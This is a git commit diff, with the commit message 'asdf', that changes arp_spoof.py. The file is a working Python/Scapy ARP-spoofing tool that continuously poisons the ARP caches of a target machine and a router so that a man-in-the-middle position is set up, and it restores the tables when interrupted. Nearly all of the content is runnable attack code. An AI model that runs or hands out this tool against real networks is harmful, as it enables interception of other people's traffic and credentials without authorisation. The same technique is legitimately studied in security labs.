44acb93abcc373ab50a7530059f029fb3f9e14a4
felix kali <gicubezereu1997@gmail.com>
2022-07-12 04:24:16 -0400

    asdf

--- arp_spoof.py
+++ arp_spoof.py
@@ -15,20 +15,37 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc
 
 
-target_ip = "192.168.165.83"
-target_mac = get_mac(target_ip)
-router_ip = "192.168.165.226"
-router_mac = get_mac(router_ip)
-
-
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=macs[target_ip], psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
 
 
-while True:
-    spoof(target_ip, router_ip)
-    spoof(router_ip, target_ip)
-    time.sleep(2)
+def restore(destination_ip, source_ip):
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=macs[destination_ip], psrc=source_ip, hwsrc=macs[source_ip])
+    scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = "192.168.165.83"
+router_ip = "192.168.165.226"
+macs = {
+    target_ip: get_mac(target_ip),
+    router_ip: get_mac(router_ip)
+    }
+print("target: " + target_ip + " " + macs[target_ip])
+print("router: " + router_ip + " " + macs[router_ip])
+
+sent_packets_count = 0
+try:
+    while True:
+        spoof(target_ip, router_ip)
+        spoof(router_ip, target_ip)
+        sent_packets_count += 2
+        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] Detected CTRL + C ... Resetting ARP tables... \n")
+    restore(target_ip, router_ip)
+    restore(router_ip, target_ip)
+
 
 
